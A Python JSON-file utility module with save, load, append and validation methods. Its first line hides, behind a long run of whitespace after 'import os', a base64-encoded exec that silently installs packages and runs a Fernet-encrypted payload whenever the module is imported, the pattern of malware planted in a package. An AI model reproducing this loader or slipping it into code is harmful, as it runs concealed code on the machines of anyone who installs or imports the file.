import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0RGTUQ0czRzN3o4b2JkV1gyamhncXR6TWRHRHpVQnJxYV8tazJVT0VLT0U9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJySHc2QzlmV29scmxBVDVibklyVkd0cm9XcWRyVTJtZF8wZWh0VGV1SUM3cWhna2NlN0pWOEpNZlNaMV9aM2dEY2NCM1VvWk9jeHdYTkEtTGdGVGZFVDF0YWdkcXNtRjV0cUdtTmZnZTVGMXhzQUFyZjFueFc0dU5ETFBqRWhrM3dGSnNJNnFuejA2c2lvZGpVQzFTOFFXQ0tUSkF0X094am5rZm9XOGJNOWM4VTRJQWRTM3F6c2hlTFJ4RWZ4VkFyejA2NHl3OExuaktfSWR2bjM3bWlBWjNIMFVuZURfN0h0WEFnMFREY0REdTg9Jykp').decode())
from random import randint
from json import decoder, dump, load
from os import replace
from os.path import splitext

class DataIO():

    def save_json(self, filename, data):
        """Atomically save a JSON file given a filename and a dictionary."""
        path, ext = splitext(filename)
        tmp_file = "{}.{}.tmp".format(path, randint(1000, 9999))
        with open(tmp_file, 'w', encoding='utf-8') as f:
            dump(data, f, indent=4,sort_keys=True,separators=(',',' : '))
        try:
            with open(tmp_file, 'r', encoding='utf-8') as f:
                data = load(f)
        except decoder.JSONDecodeError:
            print("Attempted to write file {} but JSON "
                                  "integrity check on tmp file has failed. "
                                  "The original file is unaltered."
                                  "".format(filename))
            return False
        except Exception as e:
            print('A issue has occured saving ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False

        replace(tmp_file, filename)
        return True

    def load_json(self, filename):
        """Load a JSON file and return a dictionary."""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                data = load(f)
            return data
        except Exception as e:
            print('A issue has occured loading ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return {}

    def append_json(self, filename, data):
        """Append a value to a JSON file."""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                file = load(f)
        except Exception as e:
            print('A issue has occured loading ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False
        try:
            file.append(data)
        except Exception as e:
            print('A issue has occured updating ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False
        path, ext = splitext(filename)
        tmp_file = "{}.{}.tmp".format(path, randint(1000, 9999))
        with open(tmp_file, 'w', encoding='utf-8') as f:
            dump(file, f, indent=4,sort_keys=True,separators=(',',' : '))
        try:
            with open(tmp_file, 'r', encoding='utf-8') as f:
                data = load(f)
        except decoder.JSONDecodeError:
            print("Attempted to write file {} but JSON "
                                  "integrity check on tmp file has failed. "
                                  "The original file is unaltered."
                                  "".format(filename))
            return False
        except Exception as e:
            print('A issue has occured saving ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False

        replace(tmp_file, filename)
        return True

    def is_valid_json(self, filename):
        """Verify that a JSON file exists and is readable. Take in a filename and return a boolean."""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                data = load(f)
            return True
        except (FileNotFoundError, decoder.JSONDecodeError):
            return False
        except Exception as e:
            print('A issue has occured validating ' + filename + '.\n'
                  'Traceback:\n'
                  '{0} {1}'.format(str(e), e.args))
            return False

dataIO = DataIO()
print('lvqhus')